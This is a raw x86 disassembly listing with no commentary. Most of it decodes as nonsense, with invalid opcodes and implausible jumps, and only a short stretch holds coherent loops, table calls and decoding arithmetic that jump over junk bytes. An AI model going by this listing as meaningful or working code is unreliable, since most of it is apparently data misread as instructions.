  4020c9:	mov    edx,0x3e22c06d
  4020ce:	mov    bl,0x68
  4020d0:	imul   eax,DWORD PTR [ebp+0xb],0x515df98a
  4020d7:	push   ds
  4020d8:	shl    DWORD PTR [eax+0x3ce108de],cl
  4020de:	shl    BYTE PTR [esp+eiz*8-0x4c],1
  4020e2:	xchg   edx,eax
  4020e3:	(bad)  
  4020e4:	ss call 0x293a6aa1
  4020ea:	stos   BYTE PTR es:[edi],al
  4020eb:	imul   edx,DWORD PTR [ebp+0x4192e1b6],0xffffffc8
  4020f2:	sub    ecx,ecx
  4020f4:	inc    esp
  4020f5:	das    
  4020f6:	push   edx
  4020f7:	mov    esp,0x9147122b
  4020fc:	sbb    DWORD PTR [edx+eiz*1],ecx
  4020ff:	and    DWORD PTR [ecx+0x18460819],edi
  402105:	xchg   ebx,eax
  402106:	or     ebx,esp
  402108:	sbb    ecx,DWORD PTR [edi]
  40210a:	imul   edi,DWORD PTR [ecx-0x6c],0xddc43f30
  402111:	push   esi
  402112:	adc    bh,BYTE PTR [edi-0x40ed3b4a]
  402118:	or     ax,0x99f4
  40211c:	adc    DWORD PTR [edx-0x70],ebp
  40211f:	xchg   edx,eax
  402120:	(bad)  [eax-0x4b]
  402123:	inc    eax
  402124:	pusha  
  402125:	dec    edx
  402126:	push   ebx
  402127:	mov    ecx,0x92b9beea
  40212c:	(bad)  
  40212d:	lahf   
  40212e:	cwde   
  40212f:	in     al,0x4f
  402131:	data16 cmp al,0x1b
  402134:	retf   0x3736
  402137:	mov    ebp,0x2db6aa85
  40213c:	jns    0x402101
  40213e:	in     eax,dx
  40213f:	addr16 mov eax,ds:0xfb39
  402143:	ja     0x402102
  402145:	mov    DWORD PTR [edi-0x58e234ff],ecx
  40214b:	sbb    BYTE PTR ds:0x2cfdf09f,0x7c
  402152:	ja     0x40217d
  402154:	inc    edi
  402155:	test   al,0x32
  402157:	cmp    bh,0x33
  40215a:	sbb    bh,BYTE PTR [eax+0x110f1659]
  402160:	fmulp  st(6),st
  402162:	shl    BYTE PTR ds:[esi-0x2bd92ba2],1
  402169:	pop    ebp
  40216a:	xor    esp,DWORD PTR [ecx+edi*1+0x32710ce5]
  402171:	div    DWORD PTR [ecx+0x5eac197a]
  402177:	dec    esi
  402178:	jnp    0x402198
  40217a:	add    BYTE PTR [ecx-0x59e425b0],al
  402180:	outs   dx,DWORD PTR ds:[esi]
  402181:	pop    esi
  402182:	jl     0x40213f
  402184:	sbb    al,BYTE PTR [eax+edx*1+0x55a327ed]
  40218b:	outs   dx,DWORD PTR ds:[esi]
  40218c:	(bad)  
  40218d:	out    dx,eax
  40218e:	pop    esi
  40218f:	mov    cl,0x45
  402191:	or     bh,dl
  402193:	call   0xdcc98f5d
  402198:	shl    BYTE PTR [ebx],cl
  40219a:	les    esi,FWORD PTR [eax]
  40219c:	push   ss
  40219d:	mov    gs,WORD PTR [ebp+0x2e]
  4021a0:	pop    edi
  4021a1:	pop    esp
  4021a2:	dec    eax
  4021a3:	call   0x1c232e55
  4021a8:	test   al,0x4d
  4021aa:	or     al,0xa7
  4021ac:	sub    al,0x53
  4021ae:	mov    bh,0x86
  4021b0:	aaa    
  4021b1:	sahf   
  4021b2:	jae    0x40213c
  4021b4:	push   0x32e0805
  4021b9:	add    al,BYTE PTR [eax+0x3e]
  4021bc:	xor    bl,BYTE PTR [eax+ebp*4]
  4021bf:	std    
  4021c0:	jmp    0x5ff1:0xa9ad0c06
  4021c7:	cdq    
  4021c8:	test   DWORD PTR [ecx-0x16a2bf1c],ebx
  4021ce:	repz mov al,0x5f
  4021d1:	(bad)  
  4021d2:	mov    ds:0x6248c3c8,al
  4021d7:	cmp    dl,BYTE PTR [ebx+esi*2-0x49b64df4]
  4021de:	aam    0xf5
  4021e0:	adc    dh,BYTE PTR [ecx+edi*2+0x1f]
  4021e4:	dec    ebp
  4021e5:	test   DWORD PTR [edi-0x232c76e9],esp
  4021eb:	adc    DWORD PTR [edi+edx*4+0x16104681],esi
  4021f2:	outs   dx,BYTE PTR ds:[esi]
  4021f3:	pop    DWORD PTR [edx]
  4021f5:	push   ss
  4021f6:	add    ebx,DWORD PTR [eax+0x17257c76]
  4021fc:	hlt    
  4021fd:	jge    0x402207
  4021ff:	aad    0x61
  402201:	data16 (bad) 
  402203:	and    al,0xe4
  402205:	ret    
  402206:	in     al,dx
  402207:	adc    DWORD PTR [ebx],edi
  402209:	inc    eax
  40220a:	sahf   
  40220b:	sbb    al,0xc4
  40220d:	mov    edi,0xf63d7935
  402212:	mov    cl,BYTE PTR [ebp+0x48556396]
  402218:	mov    esi,0xddb20160
  40221d:	adc    DWORD PTR [ebp+esi*2+0x122ee76d],edi
  402224:	sub    edi,DWORD PTR [ecx+0x75]
  402227:	mov    al,0xf7
  402229:	inc    esp
  40222a:	retf   0xecaf
  40222d:	add    DWORD PTR [eax],ebp
  40222f:	and    al,0xb9
  402231:	sbb    BYTE PTR [eax-0x58e18e16],0x6e
  402238:	fabs   
  40223a:	mov    esi,0x427b43d2
  40223f:	jmp    0x4021f9
  402241:	enter  0x9474,0x3a
  402245:	or     DWORD PTR [ebx-0x22],ebx
  402248:	sti    
  402249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40224a:	and    ecx,edx
  40224c:	loope  0x4021f0
  40224e:	ins    DWORD PTR es:[edi],dx
  40224f:	loop   0x40224b
  402251:	dec    esp
  402252:	adc    BYTE PTR [edx+0x7afb4a78],ch
  402258:	add    eax,0x95ebedad
  40225d:	or     ebp,esp
  40225f:	dec    esi
  402260:	clc    
  402261:	xlat   BYTE PTR ds:[ebx]
  402262:	jmp    0x9076cd88
  402267:	into   
  402268:	or     al,0x50
  40226a:	or     al,0x2b
  40226c:	rcl    cl,cl
  40226e:	pushf  
  40226f:	stos   BYTE PTR es:[edi],al
  402270:	and    ecx,ecx
  402272:	out    dx,eax
  402273:	bound  ebp,QWORD PTR [eax-0x473bdc41]
  402279:	pop    ebx
  40227a:	mov    edi,0xe658788d
  40227f:	les    ebp,FWORD PTR [esi-0x47]
  402282:	call   0x8cf54392
  402287:	lods   al,BYTE PTR ds:[esi]
  402288:	fistp  DWORD PTR [ecx+0x44]
  40228b:	mov    WORD PTR [edi+0x51],?
  40228e:	inc    esi
  40228f:	push   ss
  402290:	sub    edi,edx
  402292:	sbb    DWORD PTR [esi+0x30138342],0xb
  402299:	mov    si,0x11e
  40229d:	cmp    BYTE PTR [ecx+0x70f15b13],cl
  4022a3:	shl    DWORD PTR ds:0x640cf05f,1
  4022a9:	lods   al,BYTE PTR ds:[esi]
  4022aa:	or     edi,DWORD PTR [eax]
  4022ac:	mov    ds:0x3b62b59c,al
  4022b1:	mov    ecx,0x7dee46b9
  4022b6:	(bad)  
  4022b7:	aad    0xbd
  4022b9:	push   ss
  4022ba:	mov    ebp,0xd1c6a8d7
  4022bf:	(bad)  
  4022c1:	sub    DWORD PTR [edx+eax*1+0x37],esp
  4022c5:	sub    eax,0xe7e879f8
  4022ca:	xchg   edi,eax
  4022cb:	inc    eax
  4022cc:	addr16 pusha 
  4022ce:	leave  
  4022cf:	aas    
  4022d0:	enter  0xf96f,0x66
  4022d4:	fcomp  QWORD PTR [edi]
  4022d6:	scas   eax,DWORD PTR es:[edi]
  4022d7:	les    eax,FWORD PTR [ecx-0x1c]
  4022da:	nop
  4022db:	mov    cl,0xb5
  4022dd:	int3   
  4022de:	lea    ecx,ds:0x41432c94
  4022e4:	retf   
  4022e5:	scas   eax,DWORD PTR es:[edi]
  4022e6:	xchg   ah,ah
  4022e8:	fisttp WORD PTR [eax+0x6b3838c0]
  4022ee:	stc    
  4022ef:	mov    cl,0x4b
  4022f1:	popa   
  4022f2:	xor    al,0x70
  4022f4:	pop    ss
  4022f5:	gs jno 0x4022cb
  4022f8:	imul   edx,DWORD PTR [esi-0x2f],0xfefce6bc
  4022ff:	imul   DWORD PTR [eax+0x7b7a1b44]
  402305:	loope  0x4022fa
  402307:	fidivr DWORD PTR [ebx-0x4e]
  40230a:	jb     0x4022db
  40230c:	add    al,0xfb
  40230e:	jnp    0x40229d
  402310:	push   edx
  402311:	jmp    0x48db:0x11fa28ac
  402318:	inc    esp
  402319:	je     0x40230e
  40231b:	icebp  
  40231c:	xchg   ebx,eax
  40231d:	xor    bl,bh
  40231f:	clc    
  402320:	xor    DWORD PTR [ecx+ebx*1-0x7c],0x10
  402325:	cdq    
  402326:	ret    0x1675
  402329:	sbb    BYTE PTR [ebx+esi*4-0x79],dl
  40232d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40232e:	mov    ecx,0x847585ac
  402333:	lods   eax,DWORD PTR ds:[esi]
  402334:	jmp    0x402393
  402336:	pop    esp
  402337:	xchg   esi,eax
  402338:	pop    es
  402339:	push   esi
  40233a:	sbb    al,0xd0
  40233c:	mov    bh,0xa5
  40233e:	enter  0xa01d,0x6b
  402342:	pop    ebp
  402343:	jns    0x4022c5
  402345:	and    BYTE PTR [esi+0x25],dl
  402348:	mov    bl,0xa4
  40234a:	pusha  
  40234b:	dec    ebx
  40234c:	je     0x4022fb
  40234e:	scas   al,BYTE PTR es:[edi]
  40234f:	jge    0x402325
  402351:	shl    ah,cl
  402353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402354:	les    edx,FWORD PTR [ebx-0x5d]
  402357:	add    eax,0x68858d2f
  40235c:	(bad)  
  40235d:	(bad)  
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433797,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x43387b
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x4337fb,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x4337fb
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x4337fb,ecx
  4023a6:	cmp    DWORD PTR ds:0x4337fb,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x4337fb,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x43383f
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x433877
  4023d7:	or     DWORD PTR ds:0x4337e7,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x4337f7,0x4338bf
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x4337ef,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x4337ef
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x4337ef,ecx
  40240a:	cmp    DWORD PTR ds:0x4337ef,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433990
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x4337ef,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x4337ef
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x4337ef,ecx
  402450:	cmp    DWORD PTR ds:0x4337ef,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx-0x6c5d5390]
  402480:	push   edi
  402481:	icebp  
  402482:	mov    edx,0x6f7e7e01
  402487:	jge    0x402507
  402489:	jle    0x402413
  40248b:	in     al,0x65
  40248d:	jnp    0x402438
  40248f:	cmp    al,0x1c
  402491:	lods   eax,DWORD PTR ds:[esi]
  402492:	in     al,0x6b
  402494:	retf   0x5e6d
  402497:	ror    BYTE PTR [edx+0xa],1
  40249a:	mov    esp,0xfd8ca392
  40249f:	push   cs
  4024a0:	mov    esi,DWORD PTR [edi-0x1e]
  4024a3:	inc    ebx
  4024a4:	shr    DWORD PTR [edx+0x55],cl
  4024a7:	clc    
  4024a8:	adc    BYTE PTR [esi+eiz*4],dh
  4024ab:	cs enter 0x12ac,0x5a
  4024b0:	aaa    
  4024b1:	sub    eax,0x249cf136
  4024b6:	mov    DWORD PTR [ebp+eiz*4+0x7776e43a],ebp
  4024bd:	clc    
  4024be:	out    dx,al
  4024bf:	shl    eax,0x69
  4024c2:	mov    ebx,0x203e15c
  4024c7:	cmc    
  4024c8:	push   ebp
  4024c9:	jge    0x402498
  4024cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024cc:	push   ecx
  4024cd:	jmp    0x3c3bac12
  4024d2:	rol    bl,cl
  4024d4:	inc    eax
  4024d5:	and    DWORD PTR [ecx-0x292d96bd],0x1deee076
  4024df:	mov    cl,dl
  4024e1:	sti    
  4024e2:	iret   
  4024e3:	retf   0x29f3
  4024e6:	enter  0xf47a,0xff
  4024ea:	dec    esp
  4024eb:	mov    ah,0xfd
  4024ed:	mul    BYTE PTR [ebx-0x57acca12]
  4024f3:	fidiv  WORD PTR [ebp+0x74]
  4024f6:	es test eax,0x992432a4
  4024fc:	add    edi,DWORD PTR [esi]
  4024fe:	mov    ebx,0x5a65b353
  402503:	cmp    dl,ah
  402505:	dec    ecx
  402506:	scas   al,BYTE PTR es:[edi]
  402507:	add    DWORD PTR [esi+0x77],esp
  40250a:	retf   0x9c4b
  40250d:	bound  esi,QWORD PTR [edi-0x2e]
  402510:	into   
  402511:	or     al,0xb8
  402513:	loope  0x402504
  402515:	cmp    BYTE PTR [edx-0x1e],bh
  402518:	inc    edx
  402519:	jge    0x402573
  40251b:	retf   0xe657
  40251e:	and    al,0xe3
  402520:	data16 std 
  402522:	sub    BYTE PTR [edi],bh
  402524:	jle    0x40259a
  402526:	aaa    
  402527:	xchg   ecx,eax
  402528:	push   ebp
  402529:	add    al,0x5c
  40252b:	ss loopne 0x4024b0
  40252e:	pusha  
  40252f:	and    DWORD PTR [ecx-0x1578a613],edx
  402535:	dec    edx
  402536:	mov    eax,0x438dc270
  40253b:	stc    
  40253c:	mov    ah,BYTE PTR [edx]
  40253e:	das    
  40253f:	push   ecx
  402540:	push   ss
  402541:	inc    edi
  402542:	add    BYTE PTR [ecx],cl
  402544:	imul   esp,edi,0x30
  402547:	mov    al,ds:0x59a036e8
  40254c:	xor    ebx,DWORD PTR [edi-0x7a]
  40254f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402551:	cmc    
  402552:	cld    
  402553:	adc    esp,DWORD PTR [ebx+ebp*1+0x1e6e963d]
  40255a:	out    0x6a,al
  40255c:	js     0x402504
  40255e:	adc    eax,esp
  402560:	fwait
  402561:	popa   
  402562:	addr16 ror bh,1
  402565:	jnp    0x4025d7
  402567:	aaa    
  402568:	add    DWORD PTR [ecx+edi*8],esp
  40256b:	mov    dh,ah
  40256d:	cdq    
  40256e:	fld    DWORD PTR [edi-0x9]
  402571:	cli    
  402572:	add    bl,bh
  402574:	xchg   ebp,eax
  402575:	cmp    bl,BYTE PTR [ecx]
  402577:	aad    0xfe
  402579:	xor    BYTE PTR [ecx-0x6f],0xf8
  40257d:	dec    esi
  40257e:	push   eax
  40257f:	sahf   
  402580:	les    ecx,FWORD PTR [eax-0x66]
  402583:	sub    eax,0xcf60d068
  402588:	sbb    al,0xd5
  40258a:	and    DWORD PTR [edx-0x44],edi
  40258d:	je     0x4025d6
  40258f:	ficomp WORD PTR [edi+0x3d685e37]
  402595:	iret   
  402596:	in     eax,0xfd
  402598:	mov    ecx,0x36761908
  40259d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40259e:	(bad)
  4025a1:	dec    ebp
  4025a2:	push   ss
  4025a3:	mov    al,ds:0x3c5c7fdd
  4025a8:	xor    eax,0xb0f9b0a5
  4025ad:	out    0x66,eax
  4025af:	ins    BYTE PTR es:[edi],dx
  4025b0:	dec    ebp
  4025b1:	(bad)  
  4025b2:	inc    eax
  4025b3:	cmp    BYTE PTR [edi-0x18f683bc],ah
  4025b9:	loopne 0x4025d4
  4025bb:	retf   
  4025bc:	popa   
  4025bd:	jl     0x4025e7
  4025bf:	or     cl,0xea
  4025c2:	xchg   DWORD PTR [ebp-0xc],edi
  4025c5:	or     eax,0xc945bbb4
  4025ca:	popf   
  4025cb:	xchg   edi,eax
  4025cc:	mov    ecx,0xbb18e086
  4025d1:	add    eax,0xf14c63d9
  4025d6:	mov    al,ds:0x702225fc
  4025db:	cmp    al,0xcc
  4025dd:	ficomp DWORD PTR [ebx+0xb864534]
  4025e3:	sahf   
  4025e4:	nop
  4025e5:	xor    BYTE PTR cs:[ebx+0x52c69f88],bl
  4025ec:	je     0x40266c
  4025ee:	jmp    0xd413364d
  4025f3:	and    ch,BYTE PTR [edi]
  4025f5:	clc    
  4025f6:	add    BYTE PTR [ebx+ecx*1-0x369fa75c],ah
  4025fd:	sub    DWORD PTR [edx+0x68e100aa],esi
  402603:	pop    esp
  402604:	std    
  402605:	xchg   ebp,eax
  402606:	sub    BYTE PTR [ebx],dl
  402608:	xchg   edx,eax
  402609:	loop   0x402678
  40260b:	mov    eax,0xe57277f2
  402610:	sbb    esi,0x31
  402613:	retf   
  402614:	fisttp WORD PTR [edi+0x41]
  402617:	jmp    0x402647
  402619:	sbb    eax,0x678d935b
  40261e:	sbb    esp,edi
  402620:	inc    ebx
  402621:	sbb    DWORD PTR [edx],esi
  402623:	gs mov esp,0x55956653
  402629:	popf   
  40262a:	ror    BYTE PTR [edi-0x45153824],1
  402630:	push   ds
  402631:	sub    al,0xf1
  402633:	loop   0x4025e9
  402635:	inc    ebx
  402636:	lea    edx,[ecx-0x6aca1f9c]
  40263c:	mov    eax,cs
  40263e:	mov    cl,0x9f
  402640:	hlt    
  402641:	fsub   DWORD PTR [edi-0x35dcc194]
  402647:	aas    
  402648:	jecxz  0x40262e
  40264a:	ds dec esi
  40264c:	aam    0xe8
  40264e:	pop    ecx
  40264f:	fst    DWORD PTR [ebx+0x78df2e31]
  402655:	rcl    DWORD PTR [eax+0x1f],1
  402658:	adc    eax,0x38d20925
  40265d:	les    esp,FWORD PTR fs:[ecx+ebx*8]
  402661:	mov    bh,0x97
  402663:	lods   eax,DWORD PTR ds:[esi]
  402664:	fild   WORD PTR [ebx]
  402666:	clc    
  402667:	stos   BYTE PTR es:[edi],al
  402668:	mov    ecx,0x633edd0
  40266d:	add    ebp,ebx
  40266f:	stos   BYTE PTR es:[edi],al
  402670:	mov    DWORD PTR [eax-0x305841b0],esp
  402676:	ja     0x4026f3
  402678:	test   DWORD PTR ds:0x25d974f8,edx
  40267e:	adc    al,0x48
  402680:	sahf   
  402681:	xor    bl,BYTE PTR [esi-0x5d6c5494]
  402687:	adc    al,0x5f
  402689:	xchg   esp,eax
  40268a:	lahf   
  40268b:	jae    0x402685
  40268d:	daa    
  40268e:	loope  0x402611
  402690:	lods   al,BYTE PTR ds:[esi]
  402691:	retf   
  402692:	dec    eax
  402693:	cmp    BYTE PTR ds:0x276a1a9d,bh
  402699:	mov    es,WORD PTR [edi-0x3b]
  40269c:	xchg   ecx,eax
  40269d:	retf   0xc245
  4026a0:	sti    
  4026a1:	mov    esi,0x724c4c21
  4026a6:	cmp    DWORD PTR [ecx+0x57],eax
  4026a9:	data16 jno 0x4026b8
  4026ac:	xchg   ebx,eax
  4026ad:	in     eax,dx
  4026ae:	and    esi,DWORD PTR [eax+edi*2-0x52]
  4026b2:	retf   0x6152
  4026b5:	fisub  DWORD PTR [esp+0x52f7dae9]
  4026bc:	inc    ebp
  4026bd:	and    ch,0x2a
  4026c0:	in     al,0x4f
  4026c2:	xchg   eax,esp
  4026c4:	sub    al,0x0
  4026c6:	push   edi
  4026c7:	mov    al,0x35
  4026c9:	ret    0xc459
  4026cc:	dec    esi
  4026cd:	int    0x4a
  4026cf:	pop    edx
  4026d0:	mov    esp,0xf5d571c
  4026d5:	jne    0x4026cb
  4026d7:	jmp    0xce7638d9
  4026dc:	push   ebx
  4026dd:	add    BYTE PTR [ecx],ch
  4026df:	sbb    ecx,0xfffffff8
  4026e2:	and    bh,BYTE PTR [edx-0x5a57ee13]
  4026e8:	or     eax,0xc51abe0c
  4026ed:	dec    ecx
  4026ee:	xchg   cl,cl
  4026f0:	loopne 0x402752
  4026f2:	push   ebp
  4026f3:	push   ebx
  4026f4:	pop    edx
  4026f5:	jbe    0x4026ed
  4026f7:	std    
  4026f8:	fsubp  st(4),st
  4026fa:	std    
  4026fb:	xor    DWORD PTR [ebx+edx*2-0x274f1c7e],ecx
  402702:	mov    ds:0x7ecdacbf,eax
  402707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402708:	inc    eax
  402709:	pop    ecx
  40270a:	adc    al,0x78
  40270c:	cmp    DWORD PTR [edi-0x4da6a5d],0x3a
  402713:	pop    eax
  402714:	mov    edx,0x1ebdd0c8
  402719:	cmp    dh,BYTE PTR [ebx+0x7f1edf1a]
  40271f:	daa    
  402720:	fimul  DWORD PTR [ebx+edx*1]
  402723:	add    edi,DWORD PTR [esi+0x3f]
  402726:	or     al,cl
  402728:	push   cs
  402729:	jecxz  0x4026e4
  40272b:	mov    eax,0x31e4bf98
  402730:	mov    edi,0x2e21d212
  402735:	ret    0xa6a2
  402738:	(bad)  
  402739:	daa    
  40273a:	dec    ebx
  40273b:	inc    edx
  40273c:	mov    DWORD PTR [ecx],ebx
  40273e:	mov    cl,0xdf
  402740:	addr16 popf 
  402742:	(bad)  
  402744:	add    BYTE PTR [esi],bh
  402746:	inc    ebx
  402747:	inc    edi
  402748:	cli    
  402749:	cmp    eax,0xe99e9013
  40274e:	sub    BYTE PTR [esi+0x6df0bc5a],0x4d
  402755:	cmp    BYTE PTR [ebx],al
  402757:	es fwait
  402759:	sbb    ebp,DWORD PTR [ecx-0x62]
  40275c:	(bad)  
  40275d:	pushf  
  40275e:	fwait
  40275f:	mov    ecx,0x4115ba4a
  402764:	inc    ebp
  402765:	lods   al,BYTE PTR ds:[esi]
  402766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402767:	pop    es
  402768:	add    BYTE PTR [edx],dh
  40276a:	arpl   WORD PTR [ebx],di
  40276c:	pop    ebp
  40276d:	jecxz  0x40273b
  40276f:	cmp    bh,BYTE PTR [ebx+0x78]
  402772:	adc    al,0xc0
  402774:	pop    esi
  402775:	xchg   ebx,eax
  402776:	test   DWORD PTR [eax+eax*1+0x32],ecx
  40277a:	orps   xmm6,XMMWORD PTR [ebp+0x6b]
  40277e:	outs   dx,BYTE PTR ds:[esi]
  40277f:	popf   
  402780:	enter  0x9fa9,0x1e
  402784:	call   0x58db85ee
  402789:	retf   
  40278a:	(bad)  
  40278b:	mov    al,0x78
  40278d:	mov    WORD PTR [ecx],?
  40278f:	dec    ebx
  402790:	ins    BYTE PTR es:[edi],dx
  402791:	sar    ebp,1
  402793:	call   FWORD PTR [edx-0x20]
  402796:	imul   edi,ebp,0xa53cd740
  40279c:	sub    al,0xe7
  40279e:	xchg   esp,eax
  40279f:	das    
  4027a0:	sbb    DWORD PTR [esi],edi
  4027a2:	bound  ebx,QWORD PTR [ecx+ebp*4-0xb]
  4027a6:	xor    esp,esp
  4027a8:	push   ebx
  4027a9:	push   ebp
  4027aa:	das    
  4027ab:	ret    
  4027ac:	fsub   DWORD PTR [ecx+0x5c]
  4027af:	dec    edx
  4027b0:	push   ebp
  4027b1:	cmp    al,0xce
  4027b3:	sub    BYTE PTR [edi],dl
  4027b5:	mov    ebp,0xdb6ba87e
  4027ba:	and    DWORD PTR [ebx],0xffffffaa
  4027bd:	mov    dh,bh
  4027bf:	cmp    ebp,DWORD PTR [edx+0x2f]
  4027c2:	hlt    
  4027c3:	shl    DWORD PTR [ecx+0x6175ece1],cl
  4027c9:	adc    ebx,ebp
  4027cb:	rcr    BYTE PTR [eax+0x287db5fe],1
  4027d1:	push   edi
  4027d2:	lods   eax,DWORD PTR ds:[esi]
  4027d3:	mov    al,es:0xa8b4dc82
  4027d9:	mov    WORD PTR [ecx+0x161f7464],ss
  4027df:	mov    esp,0xc091950f
  4027e4:	sbb    BYTE PTR [eax-0x6e59ae1c],ah
  4027ea:	repnz in eax,dx
  4027ec:	pop    ecx
  4027ed:	fidiv  DWORD PTR [eax+0x38623a22]
  4027f3:	mov    bl,0xcd
  4027f5:	mov    bh,ah
  4027f7:	jns    0x4027c5
  4027f9:	iret   
  4027fa:	adc    al,0x7a
  4027fc:	ret    0xa4bd
  4027ff:	ds and ebx,0x13
  402803:	mov    ecx,gs
  402805:	sar    esi,1
  402807:	push   esp
  402808:	add    BYTE PTR ds:0x9c50ba46,cl
  40280e:	mov    edx,0x899b7777
  402813:	sub    cl,bh
  402815:	test   edi,esp
  402817:	cmp    edx,DWORD PTR [eax]
  402819:	add    eax,0x8a862231
  40281e:	loope  0x402824
  402820:	mov    dl,0x87
  402822:	loopne 0x402817
  402824:	shl    DWORD PTR [eax-0x306c58d0],cl
  40282a:	inc    DWORD PTR [ebp+0x69]
  40282d:	lods   al,BYTE PTR ds:[esi]
  40282e:	cmc    
  40282f:	scas   al,BYTE PTR es:[edi]
  402830:	in     eax,0xf
  402832:	push   cs
  402833:	shl    BYTE PTR [ecx+0x2dc689e3],0xed
  40283a:	push   cs
  40283b:	les    edi,FWORD PTR gs:[eax]
  40283e:	jnp    0x402860
  402840:	call   0x6329:0xa3daf00b
  402847:	ffreep st(6)
  402849:	pop    esp
  40284a:	jns    0x402803
  40284c:	cmp    ebx,DWORD PTR [edi]
  40284e:	fild   DWORD PTR [ecx+ebp*8-0x7bd10ace]
  402855:	or     bh,ch
  402857:	jle    0x40286b
  402859:	std    
  40285a:	fwait
  40285b:	ins    DWORD PTR es:[edi],dx
  40285c:	inc    ebp
  40285d:	jge    0x402812
  40285f:	repnz cld 
  402861:	mov    DWORD PTR [eax],ebx
  402863:	fisttp DWORD PTR [esi+0x1f]
  402866:	xchg   esp,eax
  402867:	xchg   ebp,eax
  402868:	sub    DWORD PTR [ebp+0x64],ebx
  40286b:	adc    edx,esi
  40286d:	ins    DWORD PTR es:[edi],dx
  40286e:	jbe    0x40289a
  402870:	push   ecx
  402871:	xchg   BYTE PTR [ebx-0x38],al
  402874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402875:	push   cs
  402876:	loope  0x4028e8
  402878:	rol    BYTE PTR [eax+0x62],1
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx+0x31f3616d]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	scas   al,BYTE PTR es:[edi]
  4028cf:	dec    ebp
  4028d0:	dec    esi
  4028d1:	daa    
  4028d2:	out    dx,eax
  4028d3:	ror    BYTE PTR [esi+0x27],0x4e
  4028d7:	das    
  4028d8:	je     0x402927
  4028da:	daa    
  4028db:	jno    0x402901
  4028dd:	add    DWORD PTR [ecx-0x3],esi
  4028e0:	ins    DWORD PTR es:[edi],dx
  4028e1:	adc    ebp,DWORD PTR [edi]
  4028e3:	ffree  st(5)
  4028e5:	xor    DWORD PTR [ecx+ebp*8],0x5660c695
  4028ec:	or     bh,BYTE PTR [esi]
  4028ee:	jg     0x4028c2
  4028f0:	call   0xda5b511f
  4028f5:	xor    eax,0xd347a3d9
  4028fa:	or     edx,esp
  4028fc:	mov    ecx,0x2210b948
  402901:	dec    eax
  402902:	pop    eax
  402903:	into   
  402904:	fisttp DWORD PTR [edx-0x20]
  402907:	mov    al,0xca
  402909:	adc    ebp,DWORD PTR [eax-0x5a]
  40290c:	inc    eax
